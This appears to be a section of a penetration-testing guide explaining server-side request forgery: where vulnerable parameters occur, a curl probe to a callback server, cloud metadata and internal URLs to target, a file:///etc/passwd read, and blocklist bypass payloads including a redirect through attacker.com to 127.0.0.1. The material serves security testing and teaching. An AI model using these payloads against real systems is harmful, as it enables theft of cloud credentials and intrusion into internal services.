# Gaining Access

## Server-Side Request Forgery (SSRF)

SSRF occurs when an application fetches a remote resource (URL, file, webhook, image, PDF export, etc.) without properly validating the destination, allowing an attacker to make the server issue requests to unintended locations — internal services, cloud metadata endpoints, or other internal-only hosts.

**Where to look for it:**
- Parameters that take a URL, hostname, IP, or file path (`url=`, `path=`, `image=`, `callback=`, `webhook=`, `next=`, `dest=`, `redirect=`, `feed=`, `avatar=`)
- Features that fetch remote content server-side: PDF/screenshot generators, URL previewers, webhooks, "import from URL", SSO/OAuth callback validators, XML parsers (XXE-adjacent), file upload from URL

**Basic probing:**

```bash
# Point the parameter at a host you control and watch for the callback
curl "https://target.com/fetch?url=http://<your-collab-server>/probe"
```

Use a listener like `interactsh`, Burp Collaborator, or a simple `nc -lvnp 80` / `python3 -m http.server` on a public IP to confirm out-of-band interaction.

**Common targets once SSRF is confirmed:**

```text
# Cloud metadata endpoints (credential theft)
http://169.254.169.254/latest/meta-data/iam/security-credentials/   # AWS
http://169.254.169.254/metadata/v1/                                  # DigitalOcean
http://metadata.google.internal/computeMetadata/v1/                  # GCP (needs Metadata-Flavor: Google header)
http://169.254.169.254/metadata/instance?api-version=2021-02-01     # Azure (needs Metadata: true header)

# Internal network / service scanning
http://127.0.0.1:PORT/
http://localhost:PORT/
http://internal-service.local/

# Local file access (if scheme not restricted)
file:///etc/passwd
```

**Filter bypass techniques (when a blocklist filters `localhost`/`127.0.0.1`/private ranges):**

- Alternate IP encodings: `http://0177.0.0.1/` (octal), `http://2130706433/` (decimal), `http://0x7f000001/` (hex), `http://127.1/` (short form)
- DNS rebinding: register a domain that resolves to an internal IP
- Redirect chaining: host a redirect (`http://attacker.com/ → http://127.0.0.1/`) if the app follows redirects but only validates the initial URL
- IPv6 loopback: `http://[::1]/`
- Alternate representations: `http://127.0.0.1.nip.io/`, `http://0.0.0.0/`, embedding credentials `http://expected-host@127.0.0.1/`

**Impact to check for:** internal port scanning, reading cloud metadata credentials, hitting internal admin panels, pivoting to other internal services, and (with `file://` support) local file disclosure.
